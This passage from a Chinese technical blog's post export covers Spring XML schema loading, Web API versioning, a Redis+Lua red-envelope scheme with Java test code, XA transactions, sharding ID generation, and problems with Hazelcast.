123456http\://www.springframework.org/schema/context/spring-context-2.5.xsd=org/springframework/context/config/spring-context-2.5.xsdhttp\://www.springframework.org/schema/context/spring-context-3.0.xsd=org/springframework/context/config/spring-context-3.0.xsdhttp\://www.springframework.org/schema/context/spring-context-3.1.xsd=org/springframework/context/config/spring-context-3.1.xsdhttp\://www.springframework.org/schema/context/spring-context-3.2.xsd=org/springframework/context/config/spring-context-3.2.xsdhttp\://www.springframework.org/schema/context/spring-context.xsd=org/springframework/context/config/spring-context-3.2.xsd... 再打开jar包里的org/springframework/context/config/ 目录，可以看到下面有 1234spring-context-2.5.xsdspring-context-3.0.xsdspring-context-3.1.xsdspring-context-3.2.xsd 很明显，可以想到Spring是把XSD文件放到本地了，再在spring.schemas里做了一个映射，优先从本地里加载XSD文件。 并且Spring很贴心，把旧版本的XSD文件也全放了。这样可以防止升级了Spring版本，而配置文件里用的还是旧版本的XSD文件，然后断网了，应用启动不了。 我们还可以看到，在没有配置版本号时，用的就是当前版本的XSD文件： 1http\://www.springframework.org/schema/context/spring-context.xsd=org/springframework/context/config/spring-context-3.2.xsd 同样，我们打开dubbo的jar包，可以在它的spring.schemas文件里看到有这样的配置： 1http\://code.alibabatech.com/schema/dubbo/dubbo.xsd=META-INF/dubbo.xsd 所以，Spring在加载dubbo时，会从dubbo的jar里加载dubbo.xsd。 如何跳过Spring的XML校验？可以用这样的方式来跳过校验： 12GenericXmlApplicationContext context = new GenericXmlApplicationContext();context.setValidating(false); 如何写一个自己的spring xml namespace扩展可以参考Spring的文档，实际上是相当简单的。只要实现自己的NamespaceHandler，再配置一下spring.handlers和spring.schemas就可以了。 http://docs.spring.io/spring/docs/current/spring-framework-reference/html/extensible-xml.html 其它的一些东东 防止XSD加载不成功的一个思路 http://hellojava.info/?p=135 齐全的Spring的namespace的列表 http://stackoverflow.com/questions/11174286/spring-xml-namespaces-how-do-i-find-what-are-the-implementing-classes-behind-t Spring core 1234567891011121314aop - AopNamespaceHandlerc - SimpleConstructorNamespaceHandlercache - CacheNamespaceHandlercontext - ContextNamespaceHandlerjdbc - JdbcNamespaceHandlerjee - JeeNamespaceHandlerjms - JmsNamespaceHandlerlang - LangNamespaceHandlermvc - MvcNamespaceHandleroxm - OxmNamespaceHandlerp - SimplePropertyNamespaceHandlertask - TaskNamespaceHandlertx - TxNamespaceHandlerutil - UtilNamespaceHandler Spring Security 12security - SecurityNamespaceHandleroauth - OAuthSecurityNamespaceHandler Spring integration 123456789101112131415161718192021222324int - IntegrationNamespaceHandleramqp - AmqpNamespaceHandlerevent - EventNamespaceHandlerfeed - FeedNamespaceHandlerfile - FileNamespaceHandlerftp - FtpNamespaceHandlergemfire - GemfireIntegrationNamespaceHandlergroovy - GroovyNamespaceHandlerhttp - HttpNamespaceHandlerip - IpNamespaceHandlerjdbc - JdbcNamespaceHandlerjms - JmsNamespaceHandlerjmx - JmxNamespaceHandlermail - MailNamespaceHandlerredis - RedisNamespaceHandlerrmi - RmiNamespaceHandlerscript - ScriptNamespaceHandlersecurity - IntegrationSecurityNamespaceHandlersftp - SftpNamespaceHandlerstream - StreamNamespaceHandlertwitter - TwitterNamespaceHandlerws - WsNamespaceHandlerxml - IntegrationXmlNamespaceHandlerxmpp - XmppNamespaceHandler 总结为什么不要在Spring的配置里，配置上XSD的版本号？因为如果没有配置版本号，取的就是当前jar里的XSD文件，减少了各种风险。而且这样约定大于配置的方式很优雅。 参考http://stackoverflow.com/questions/10768873/spring-di-applicationcontext-xml-how-exactly-is-xsischemalocation-used http://stackoverflow.com/questions/11174286/spring-xml-namespaces-how-do-i-find-what-are-the-implementing-classes-behind-t http://docs.spring.io/spring/docs/current/spring-framework-reference/html/extensible-xml.html]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>xml</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web API 版本控制的几种方式]]></title>
    <url>%2Fweb-api%2F</url>
    <content type="text"><![CDATA[http://www.troyhunt.com/2014/02/your-api-versioning-is-wrong-which-is.html 这篇文章写得很好，介绍了三种实现web api版本化的三种方式。我从评论里又收集到两种方式，所以一共是5种： 方式一：利用URL 12HTTP GET:https://haveibeenpwned.com/api/v2/breachedaccount/foo 方式二：利用用户自定义的request header 123HTTP GET:https://haveibeenpwned.com/api/breachedaccount/fooapi-version: 2 方式三：利用content type 123HTTP GET:https://haveibeenpwned.com/api/breachedaccount/fooAccept: application/vnd.haveibeenpwned.v2+json 方式四：利用content type 123HTTP GET:https://haveibeenpwned.com/api/breachedaccount/fooAccept: application/vnd.haveibeenpwned+json; version=2.0 这个方式和方式三的小不同的地方是，把版本号分离出来了。 方式五：利用URL里的parameter 12HTTP GET:https://haveibeenpwned.com/api/breachedaccount/foo?v=2 作者说他最喜欢第三种方式，因为 URL不用改变 客户端应该通过accept header来表明自己想接收的是什么样的数据。 但作者很蛋疼地在他的网站上把前面三种方式都实现了，而且都支持。https://haveibeenpwned.com/API/v2 我个人最喜欢的是第二种方式，因为这个用spring mvc实现最容易，也最简洁。 因为只要在Controler上用@RequestMapping标明版本即可。不用再去各种匹配，各种识别。 如果是自己写一个Annotation来识别的话，也要花些功夫，而且怎么无缝地转发到原有的Spring mvc的配置也是个问题。 1234@Controller@RequestMapping(headers="apt-version=2")public class TestControllerV2 &#123;&#125; 另外这个网站列举了很多国外的有名网站是如何实现web api版本控制的。 http://www.lexicalscope.com/blog/2012/03/12/how-are-rest-apis-versioned/]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>restful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用redis + lua解决抢红包高并发的问题]]></title>
    <url>%2Fredis-lua-hongbao%2F</url>
    <content type="text"><![CDATA[抢红包的需求分析抢红包的场景有点像秒杀，但是要比秒杀简单点。因为秒杀通常要和库存相关。而抢红包则可以允许有些红包没有被抢到，因为发红包的人不会有损失，没抢完的钱再退回给发红包的人即可。另外像小米这样的抢购也要比淘宝的要简单，也是因为像小米这样是一个公司的，如果有少量没有抢到，则下次再抢，人工修复下数据是很简单的事。而像淘宝这么多商品，要是每一个都存在着修复数据的风险，那如果出故障了则很麻烦。 淘宝的专家丁奇有个文章有写到淘宝是如何应对秒杀的：《秒杀场景下MySQL的低效–原因和改进》 http://blog.nosqlfan.com/html/4209.html 基于redis的抢红包方案下面介绍一种基于redis的抢红包方案。 把原始的红包称为大红包，拆分后的红包称为小红包。 小红包预先生成，插到数据库里，红包对应的用户ID是null。生成算法见另一篇blog：http://blog.csdn.net/hengyunabc/article/details/19177877 每个大红包对应两个redis队列，一个是未消费红包队列，另一个是已消费红包队列。开始时，把未抢的小红包全放到未消费红包队列里。 未消费红包队列里是json字符串，如{userId:&#39;789&#39;, money:&#39;300&#39;}。 在redis中用一个map来过滤已抢到红包的用户。 抢红包时，先判断用户是否抢过红包，如果没有，则从未消费红包队列中取出一个小红包，再push到另一个已消费队列中，最后把用户ID放入去重的map中。 用一个单线程批量把已消费队列里的红包取出来，再批量update红包的用户ID到数据库里。 上面的流程是很清楚的，但是在第4步时，如果是用户快速点了两次，或者开了两个浏览器来抢红包，会不会有可能用户抢到了两个红包？ 为了解决这个问题，采用了lua脚本方式，让第4步整个过程是原子性地执行。 下面是在redis上执行的Lua脚本： 1234567891011121314151617181920212223-- 函数：尝试获得红包，如果成功，则返回json字符串，如果不成功，则返回空-- 参数：红包队列名， 已消费的队列名，去重的Map名，用户ID-- 返回值：nil 或者 json字符串，包含用户ID：userId，红包ID：id，红包金额：money -- 如果用户已抢过红包，则返回nilif redis.call('hexists', KEYS[3], KEYS[4]) ~= 0 then return nilelse -- 先取出一个小红包 local hongBao = redis.call('rpop', KEYS[1]); if hongBao then local x = cjson.decode(hongBao); -- 加入用户ID信息 x['userId'] = KEYS[4]; local re = cjson.encode(x); -- 把用户ID放到去重的set里 redis.call('hset', KEYS[3], KEYS[4], KEYS[4]); -- 把红包放到已消费队列里 redis.call('lpush', KEYS[2], re); return re; endendreturn nil 下面是测试代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101public class TestEval &#123; static String host = "localhost"; static int honBaoCount = 1_0_0000; static int threadCount = 20; static String hongBaoList = "hongBaoList"; static String hongBaoConsumedList = "hongBaoConsumedList"; static String hongBaoConsumedMap = "hongBaoConsumedMap"; static Random random = new Random(); // -- 函数：尝试获得红包，如果成功，则返回json字符串，如果不成功，则返回空// -- 参数：红包队列名， 已消费的队列名，去重的Map名，用户ID// -- 返回值：nil 或者 json字符串，包含用户ID：userId，红包ID：id，红包金额：money static String tryGetHongBaoScript = // "local bConsumed = redis.call('hexists', KEYS[3], KEYS[4]);\n"// + "print('bConsumed:' ,bConsumed);\n" "if redis.call('hexists', KEYS[3], KEYS[4]) ~= 0 then\n" + "return nil\n" + "else\n" + "local hongBao = redis.call('rpop', KEYS[1]);\n"// + "print('hongBao:', hongBao);\n" + "if hongBao then\n" + "local x = cjson.decode(hongBao);\n" + "x['userId'] = KEYS[4];\n" + "local re = cjson.encode(x);\n" + "redis.call('hset', KEYS[3], KEYS[4], KEYS[4]);\n" + "redis.call('lpush', KEYS[2], re);\n" + "return re;\n" + "end\n" + "end\n" + "return nil"; static StopWatch watch = new StopWatch(); public static void main(String[] args) throws InterruptedException &#123;// testEval(); generateTestData(); testTryGetHongBao(); &#125; static public void generateTestData() throws InterruptedException &#123; Jedis jedis = new Jedis(host); jedis.flushAll(); final CountDownLatch latch = new CountDownLatch(threadCount); for(int i = 0; i &lt; threadCount; ++i) &#123; final int temp = i; Thread thread = new Thread() &#123; public void run() &#123; Jedis jedis = new Jedis(host); int per = honBaoCount/threadCount; JSONObject object = new JSONObject(); for(int j = temp * per; j &lt; (temp+1) * per; j++) &#123; object.put("id", j); object.put("money", j); jedis.lpush(hongBaoList, object.toJSONString()); &#125; latch.countDown(); &#125; &#125;; thread.start(); &#125; latch.await(); &#125; static public void testTryGetHongBao() throws InterruptedException &#123; final CountDownLatch latch = new CountDownLatch(threadCount); System.err.println("start:" + System.currentTimeMillis()/1000); watch.start(); for(int i = 0; i &lt; threadCount; ++i) &#123; final int temp = i; Thread thread = new Thread() &#123; public void run() &#123; Jedis jedis = new Jedis(host); String sha = jedis.scriptLoad(tryGetHongBaoScript); int j = honBaoCount/threadCount * temp; while(true) &#123; Object object = jedis.eval(tryGetHongBaoScript, 4, hongBaoList, hongBaoConsumedList, hongBaoConsumedMap, "" + j); j++; if (object != null) &#123;// System.out.println("get hongBao:" + object); &#125;else &#123; //已经取完了 if(jedis.llen(hongBaoList) == 0) break; &#125; &#125; latch.countDown(); &#125; &#125;; thread.start(); &#125; latch.await(); watch.stop(); System.err.println("time:" + watch.getTotalTimeSeconds()); System.err.println("speed:" + honBaoCount/watch.getTotalTimeSeconds()); System.err.println("end:" + System.currentTimeMillis()/1000); &#125;&#125; 测试结果20个线程，每秒可以抢2.5万个，足以应付绝大部分的抢红包场景。 如果是真的应付不了，拆分到几个redis集群里，或者改为批量抢红包，也足够应付。 总结redis的抢红包方案，虽然在极端情况下（即redis挂掉）会丢失一秒的数据，但是却是一个扩展性很强，足以应付高并发的抢红包方案。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>redis</tag>
        <tag>lua</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[扯谈下XA事务]]></title>
    <url>%2Fabout-xa-transaction%2F</url>
    <content type="text"><![CDATA[普通事务普通事务的实现是比较好理解的。以jdbm3为例，大概是这样的过程： 每个事务都新建一个事务文件，当commit时，先把修改过的数据块，写到事务文件里，然后再一次性地写到数据库文件里。 如果commit时挂掉了，那么重启之后，会再次从事务文件里把修改过的块写到数据库文件里。最后再删除事务文件。 https://github.com/jankotek/JDBM3 但是XA事务，即所谓的分布式事务却令人感到云里雾里。一是资料很少，网上的各种配置资料都是流于表面；二是可能实际应用的人也少。 最近研究了下，算是找到点门道了。 二阶段提交（Two-phase Commit）首先，XA事务是基于二阶段提交（Two-phase Commit）实现的。二阶段提交本身并没有什么令人疑惑的地方。看wiki就可以知道是怎么回事了。 简而言之，有二种角色，事务管理者（DM, Transaction Manager），资源管理器（RM, Resource Manager），通常即数据库或者JMS服务器。 下面两个图片来自：http://www.infoq.com/cn/articles/xa-transactions-handle 出错回滚： 当然，还有各种中间出错时，要处理的情况，详细可以看infoq的原文。 令人疑惑的atomikos二阶段提交协议是很容易理解的，但是真正令我疑惑的是Java实现的atomikos，一个分布式事务的Transaction Manager组件。 开始的时候，我以为事务管理器(TM)都是独立的一个服务，或者一个独立的进程，它和资源管理器(RM)之间通过网络通迅。 但是在网上看一些atomikos配置文章，都没有提到如何配置一个独立的Transaction Manager，只是简单地介绍了下如何配置atomikos，这些配置都是和应用在一起的。 而从配置里面也没法看出是如何保证在事务过程中，如果应用的进程挂掉后，是如何恢复的。 再把atomikos的例子代码下载下来，发现也没有提到是如何保证事务在失败后，如何协调的。 比如，在第二段提交时，当RM1 commit完成了，而RM2 commit还没有完成，而这时TM，即配置了atomikos的应用程序崩溃，那么这个事务并没有完成，还需要TM重启后协调，才能最终完成这个事务。但是没看到恢复部分的配置。 没办法，只能亲自跑一遍代码了。 跑了下atomikos的代码，在第二阶段提交时，把进程杀掉，发现的确是可以自动处理回滚事务，或者再次提交的。那么信息是保存在哪里的？也没有看到有什么配置文件。 最终，只能下XA的规范下载下来，再一点点慢慢看。 在The XA Specification里的2.3小节：Transaction Completion and Recovery 明确提到TM是要记录日志的： 123456789In Phase 2, the TM issues all RMs an actual request to commit or roll back thetransaction branch, as the case may be. (Before issuing requests to commit, the TMstably records the fact that it decided to commit, as well as a list of all involved RMs.)All RMs commit or roll back changes to shared resources and then return status to theTM. The TM can then discard its knowledge of the global transaction. TM是一定要把事务的信息，比如XID，哪个RM已经完成了等保存起来的。只有当全部的RM提交或者回滚完后，才能丢弃这些事务的信息。 于是再查看下atomikos例子运行目录，果然有一些文件日志文件： 12345127.0.1.1.tm13.epochtmlog13.logtmlog.lcktm.outtm.out.lck 原来atomikos是通过在应用的目录下生成日志文件来保证，如果失败，在重启后可以通过日志来完成未完成的事务。 XA事务的假设条件从XA的规范里找到了下面的说法： 1234567The X/Open DTP model makes these assumptions:TMs and RMs have access to stable storage TM和RM都有牢靠的存储TMs coordinate and control recovery TM协调和控制恢复流程RMs provide for their own restart and recovery of their own state. On request, an RM must give a TM a list of XIDs that the RM has prepared for commitment or has heuristically completed. RM在得启和恢复时，得回应TM的请求，返回一系列的XID，是prepared的，或者是已经启发式地完成了的 也就是说，XA事务都假定了TM和RM都是有牢靠的存储的，所以也保证了TM重启后可以从日志里恢复还没处理完的事务。 TM可以向RM查询事务的状态，RM必须要返回一系列事务的XID，表明事务是prepared状态，还是已经commit的状态。 到这里，应该很明了了，XA事务是其限制的，而TM是XA事务的一个单点，TM必须要非常地牢靠。 从XA的接口函数，就可以大概看出协议是怎么工作的（来自XA规范文档）： 如何避免XA事务XA事务的明显问题是timeout问题，比如当一个RM出问题了，那么整个事务只能处于等待状态。这样可以会连锁反应，导致整个系统都很慢，最终不可用。 避免使用XA事务的方法通常是最终一致性。 举个例子，比如用户充值300元，为了减少DB的压力，先把这个放到消息队列里，然后后端再从消息队列里取出消息，更新DB。 那么如何保证，这条消息不会被重复消费？或者重复消费后，仍能保证结果是正确的？ 在消息里带上用户帐号在数据库里的版本，在更新时比较数据的版本，如果相同则加上300； 比如用户本来有500元，那么消息是更新用户的钱数为800，而不是加上300； 另外建一个消息是否被消费的表，记录消息ID，在事务里，先判断消息是否已经消息过，如果没有，则更新数据库，加上300,否则说明已经消费过了，丢弃。 前面两种方法都必须从流程上保证是单方向的，不能插入其它的东东。 其它的一些东东貌似一直有人想用zookeeper来实现2pc，或者类似的东东，因为zookeeper是比较可靠的。但是感觉也没有办法解决timeout问题。 微软的XA事务恢复流程的文档： http://msdn.microsoft.com/en-us/library/windows/desktop/ms681775(v=vs.85).aspx There are two forms of XA transaction recovery, as follows: Cold recovery. Cold recovery performed if the transaction manager process fails while a connection to an XA resource manager is open. When the transaction manager restarts, it reads the transaction manager log file and re-establishes the connection to the XA resource manager by calling xa_open_entry. It then initiates XA recover by calling xa_recover_entry. Hot recovery. Hot recovery is performed if the transaction manager remains up while the connection between the transaction manager and the XA resource manager fails because the XA resource manager or the network fails. After the failure, the transaction manager periodically calls xa_open_entry to reconnect to the XA resource manager. When the connection is reestablished, the transaction manager initiates XA recovery by calling xa_recover_entry. 总结XA事务没有什么神秘的地方，二阶段提交也是一个人们很自然的一个处理方式。 只不过，这个是规范，如果有多个资源之间要协调，而且都支持XA事务，那么会比较方便 。 参考 The XA Specification 下载：http://download.csdn.net/detail/hengyunabc/6940529 http://en.wikipedia.org/wiki/Two-phase_commit_protocol http://www.infoq.com/cn/articles/xa-transactions-handle http://java.sun.com/javaee/technologies/jta/index.jsp https://github.com/bitronix/btm 一个开源的JTA Transaction Manager]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>database</tag>
        <tag>transaction</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分片(Sharding)的全局ID生成]]></title>
    <url>%2Fsharding-id%2F</url>
    <content type="text"><![CDATA[这里最后redis生成ID的文章已经过时，新的请参考： http://blog.csdn.net/hengyunabc/article/details/44244951 前言数据在分片时，典型的是分库分表，就有一个全局ID生成的问题。单纯的生成全局ID并不是什么难题，但是生成的ID通常要满足分片的一些要求： 不能有单点故障。 以时间为序，或者ID里包含时间。这样一是可以少一个索引，二是冷热数据容易分离。 可以控制ShardingId。比如某一个用户的文章要放在同一个分片内，这样查询效率高，修改也容易。 不要太长，最好64bit。使用long比较好操作，如果是96bit，那就要各种移位相当的不方便，还有可能有些组件不能支持这么大的ID。 先来看看老外的做法，以时间顺序： flickrflickr巧妙地使用了mysql的自增ID，及replace into语法，十分简洁地实现了分片ID生成功能。 首先，创建一个表： 123456CREATE TABLE `Tickets64` ( `id` bigint(20) unsigned NOT NULL auto_increment, `stub` char(1) NOT NULL default '', PRIMARY KEY (`id`), UNIQUE KEY `stub` (`stub`)) ENGINE=MyISAM 使用上面的sql可以得到一个ID： 12REPLACE INTO Tickets64 (stub) VALUES ('a');SELECT LAST_INSERT_ID(); 因为使用了replace into的语法，实际上，Tickets64这个表里的数据永远都是这样的： 12345+-------------------+------+| id | stub |+-------------------+------+| 72157623227190423 | a |+-------------------+------+ 那么如何解决单点故障呢？很简单，利用mysql的自增ID即可。比如有两台ID生成服务器，设置成下面即可： 1234567TicketServer1:auto-increment-increment = 2auto-increment-offset = 1 TicketServer2:auto-increment-increment = 2auto-increment-offset = 2 优点： 简单可靠。 缺点： ID只是一个ID，没有带入时间，shardingId等信息。 twittertwitter利用zookeeper实现了一个全局ID生成的服务snowflake，https://github.com/twitter/snowflake，可以生成全局唯一的64bit ID。 生成的ID的构成： 123时间--用前面41 bit来表示时间，精确到毫秒，可以表示69年的数据机器ID--用10 bit来表示，也就是说可以部署1024台机器序列数--用12 bit来表示，意味着每台机器，每毫秒最多可以生成4096个ID 优点： 充分把信息保存到ID里。 缺点： 结构略复杂，要依赖zookeeper。 分片ID不能灵活生成。 instagraminstagram参考了flickr的方案，再结合twitter的经验，利用Postgres数据库的特性，实现了一个更简单可靠的ID生成服务。 instagram是这样设计它们的ID的： 使用41 bit来存放时间，精确到毫秒，可以使用41年。 使用13 bit来存放逻辑分片ID。 使用10 bit来存放自增长ID，意味着每台机器，每毫秒最多可以生成1024个ID 以instagram举的例子为说明： 假定时间是September 9th, 2011, at 5:00pm，则毫秒数是1387263000（直接使用系统得到的从1970年开始的毫秒数）。那么先把时间数据放到ID里： id = 1387263000 &lt;&lt; (64-41) 再把分片ID放到时间里，假定用户ID是31341，有2000个逻辑分片，则分片ID是31341 % 2000 -&gt; 1341： id |= 1341 &lt;&lt; (64-41-13) 最后，把自增序列放ID里，假定前一个序列是5000,则新的序列是5001： id |= (5001 % 1024) 这样就得到了一个全局的分片ID。 下面列出instagram使用的Postgres schema的sql： 123456789101112131415REATE OR REPLACE FUNCTION insta5.next_id(OUT result bigint) AS $$DECLARE our_epoch bigint := 1314220021721; seq_id bigint; now_millis bigint; shard_id int := 5;BEGIN SELECT nextval('insta5.table_id_seq') %% 1024 INTO seq_id; SELECT FLOOR(EXTRACT(EPOCH FROM clock_timestamp()) * 1000) INTO now_millis; result := (now_millis - our_epoch) &lt;&lt; 23; result := result | (shard_id &lt;&lt; 10); result := result | (seq_id);END;$$ LANGUAGE PLPGSQL; 则在插入新数据时，直接用类似下面的SQL即可（连请求生成ID的步骤都省略了！）： 1234CREATE TABLE insta5.our_table ( "id" bigint NOT NULL DEFAULT insta5.next_id(), ...rest of table schema...) 即使是不懂Postgres数据库，也能从上面的SQL看出个大概。把这个移植到mysql上应该也不是什么难事。 缺点： 貌似真的没啥缺点。 优点： 充分把信息保存到ID里。 充分利用数据库自身的机制，程序完全不用额外处理，直接插入到对应的分片的表即可。 使用redis的方案站在前人的肩膀上，我想到了一个利用redis + lua的方案。 首先，lua内置的时间函数不能精确到毫秒，因此先要修改下redis的代码，增加currentMiliseconds函数，我偷懒，直接加到math模块里了。 修改redis代码下的scripting.c文件，加入下面的内容： 1234567891011121314151617181920#include &lt;sys/time.h&gt; int redis_math_currentMiliseconds (lua_State *L); void scriptingInit(void) &#123; ... lua_pushstring(lua,"currentMiliseconds"); lua_pushcfunction(lua,redis_math_currentMiliseconds); lua_settable(lua,-3); lua_setglobal(lua,"math"); ...&#125; int redis_math_currentMiliseconds(lua_State *L) &#123; struct timeval now; gettimeofday(&amp;now, NULL); lua_pushnumber(L, now.tv_sec*1000 + now.tv_usec/1000); return 1;&#125; 这个方案直接返回三元组（时间，分片ID，增长序列），当然Lua脚本是非常灵活的，可以自己随意修改。 123时间：redis服务器上的毫秒数分片ID：由传递进来的参数KEYS[1]%1024得到。增长序列：由redis上&quot;idgenerator_next_&quot; 为前缀，接分片ID的Key用incrby命令得到。 例如，用户发一个文章，要生成一个文章ID，假定用户ID是14532，则 123time &lt;-- math.currentMiliseconds();shardindId &lt;-- 14532 % 1024; //即196articleId &lt;-- incrby idgenerator_next_196 1 //1是增长的步长 用lua脚本表示是： 1234local step = redis.call('GET', 'idgenerator_step');local shardId = KEYS[1] % 1024;local next = redis.call('INCRBY', 'idgenerator_next_' .. shardId, step);return &#123;math.currentMiliseconds(), shardId, next&#125;; “idgenerator_step”这个key用来存放增长的步长。客户端用eval执行上面的脚本，得到三元组之后，可以自由组合成64bit的全局ID。 上面只是一个服务器，那么如何解决单点问题呢？ 上面的“idgenerator_step”的作用就体现出来了。 比如，要部署三台redis做为ID生成服务器，分别是A,B,C。那么在启动时设置redis-A下面的键值： 12idgenerator_step = 3idgenerator_next_1, idgenerator_next_2, idgenerator_next_3 ... idgenerator_next_1024 = 1 设置redis-B下面的键值： 12idgenerator_step = 3idgenerator_next_1, idgenerator_next_2, idgenerator_next_3 ... idgenerator_next_1024 = 2 设置redis-C下面的键值： 12idgenerator_step = 3idgenerator_next_1, idgenerator_next_2, idgenerator_next_3 ... idgenerator_next_1024 = 3 那么上面三台ID生成服务器之间就是完全独立的，而且平等关系的。任意一台服务器挂掉都不影响，客户端只要随机选择一台去用eval命令得到三元组即可。 我测试了下单台的redis服务器每秒可以生成3万个ID。那么部署三台ID服务器足以支持任何的应用了。 测试程序见这里： https://gist.github.com/hengyunabc/9032295 缺点： 如果不熟悉lua脚本，可能定制自己的ID规则等比较麻烦。 注意机器时间不能设置为自动同步的，否则可能会因为时间同步，而导致ID重复了。 优点： 非常的快，而且可以线性部署。 可以随意定制自己的Lua脚本，生成各种业务的ID。 其它的东东MongoDB的Objectid，这个实在是太长了要12个字节： 123456ObjectId is a 12-byte BSON type, constructed using: a 4-byte value representing the seconds since the Unix epoch,a 3-byte machine identifier,a 2-byte process id, anda 3-byte counter, starting with a random value. 总结生成全局ID并不很难实现的东东，不过从各个网络的做法，及演进还是可以学到很多东东。有时候一些简单现成的组件就可以解决问题，只是缺少思路而已。 参考 http://code.flickr.net/2010/02/08/ticket-servers-distributed-unique-primary-keys-on-the-cheap/ http://instagram-engineering.tumblr.com/post/10853187575/sharding-ids-at-instagram https://github.com/twitter/snowflake/ http://docs.mongodb.org/manual/reference/object-id/ http://www.redisdoc.com/en/latest/script/eval.html redis脚本参考]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>redis</tag>
        <tag>sharding</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hazelcast的坑爹事]]></title>
    <url>%2Fabout-hazelcast%2F</url>
    <content type="text"><![CDATA[简介开源中国的简介： Hazelcast是一个高度可扩展的数据分发和集群平台。特性包括： 提供java.util.{Queue, Set, List, Map}分布式实现。 提供java.util.concurrency.locks.Lock分布式实现。 提供java.util.concurrent.ExecutorService分布式实现。 提供用于一对多关系的分布式MultiMap。 提供用于发布/订阅的分布式Topic（主题）。 通过JCA与J2EE容器集成和事务支持。 提供用于安全集群的Socket层加密。 支持同步和异步持久化。 为Hibernate提供二级缓存Provider 。 通过JMX监控和管理集群。 支持动态HTTP Session集群。 利用备份实现动态分割。 支持动态故障恢复。 简介是美好的，现实是坑爹的。 优点先说下优点吧： 有个Manager Center的管理界面，很漂亮，可以看到很多有用的数据。包括每个Map的请求次数等。这些在Memcached，Redis上只能看个大概。 简单的配置很方便，可以像JDK里的Map，List一样使用。 坑爹事情配置各种找不到有很多xml的配置方式没有写在文档上，要到代码里各种找。友情提示，可以到代码里的test目录下找到比较完整的配置： https://github.com/hazelcast/hazelcast/blob/maintenance-3.x/hazelcast-spring/src/test/resources/com/hazelcast/spring/node-client-applicationContext-hazelcast.xml 有很多参数的配置没有写在文档上，要到代码里各种找。友情提示，在com.hazelcast.instance.GroupProperties 这个类里找到一些在文档上没有的配置参数。 默认的超时配置太长很多超时配置都是上百秒的，试想现在的网站或者应用，有哪个可以忍受上百秒的超时。从另一个侧面也可以看出hazelcast的自己的信心不足，要靠超长时间的超时来保证运行的正确性。 即使配置了较短的超时时间，还是有可能会有各种出人意料的超时，认真研究过代码后，发现是有很多超时时间是在代码里写死的。。 版本之间不兼容版本之间不兼容，不能滚动升级。这就意味着，当升级时，整个集群都要一块重启，这对很多网站来说，是不能忍受的。据说从3.1版本后会保证小版本的兼容性。 https://github.com/hazelcast/hazelcast/issues/14 hazelcast里代码一大问题就是把序列化方案和网络通讯混在一起了，导致各种升级兼容问题。每个消息包在解析时，都有可能因为类有改动而不兼容。 而且序列化方案还是那种要实现一个特定接口的。在Protobuf，Thrift，及各种基于反射的序列化方案这么流行的今天，很难想像会有这样难用的序列化方式。 一个结点出问题，影响整个集群当集群里某个节点出故障时，比如OOM，CPU100%，没反应之后，集群里发到那个结点的操作就各种超时，各种不正常。这个可以算是hazelcast的一个致命的缺点。 我们线上的集群有30多个结点，随便一个有问题，都会导致整个集群有问题。另外，当集群里有一个应用下线/上线，都会引起数据的迁移，尽管迁移是自动的，但是也是一个不可控的风险。 我们开始时用的是hazelcast2.5.1，后来升级到3.1.3版本。升级后发现两个结点间经常会有网络流量超高的情况，最后发现是merge-policy的配置在3.0只能配置类的全名，而在2.5是可以配置一个简称的。然后在集群里有数据要迁移，进行Merge时，就会因为ClassNotFoundException而失败。而Hazelcast坑爹的地方在于它不断地重试，而且是无停顿地重试，从而导致两个结点之间网络流量超高，甚至超过了100Mbps。 hazelcast client很难用首先，还是文档太少，很多配置根本没有提到，得自己到代码里去找。 另外，如果hazelcast server集群全部挂掉后，client居然不会自己重连（重试3次就放弃了）。现在的各种组件重启是很正常的事情，而hazelcast client居然不会自动重连，真心令人无语。更加扯蛋的是，比如map.get，如果没有连接上，会抛出一个RuntimeException，那么整个线程都退出了。 3.0版本和3.0.2版本之间的配置格式居然有很大的变化，很多时候，找个配置，得自己去看xml的xsd文件。。 结点之间Merge时，需要反序列化这个我认为是代码太多导致的混乱。结点之间数据合并时，本来只要比较下数据的版本，时间等就可以了，但是在合并时却把对象反序化出来。如果在Server端没有对应的jar包，则会抛出ClassNotFoundException。 参考这里： https://github.com/hazelcast/hazelcast/issues/1514 一些原理性的东东Partition从原理上来说，hazelcast是默认有271个partition，这271个parition平均分布在集群里的结点中，因此集群里的数据分散在每个结点中。然后在进行操作时，先计算得到key所在的partiion，再进行操作。 详细请参考PartitionServiceImpl这个类的代码： 1234public final int getPartitionId(Data key) &#123; int hash = key.getPartitionHash(); return (hash != Integer.MIN_VALUE) ? Math.abs(hash) % partitionCount : 0;&#125; NearCache的实现原理hazelcast里有一个所谓的nearcache的东东，其实这个很简单，就是一个本地的二级缓存。在get的时候先到本地的nearcache里查找，如果没有计算hash，再到对应的结点中取数据，再放到nearcache里。 参考 http://www.oschina.net/p/hazelcast http://www.hazelcast.org/docs/3.1/manual/html-single/]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>hazelcast</tag>
        <tag>serialization</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java7里try-with-resources分析]]></title>
    <url>%2Fjava-try-with-resources%2F</url>
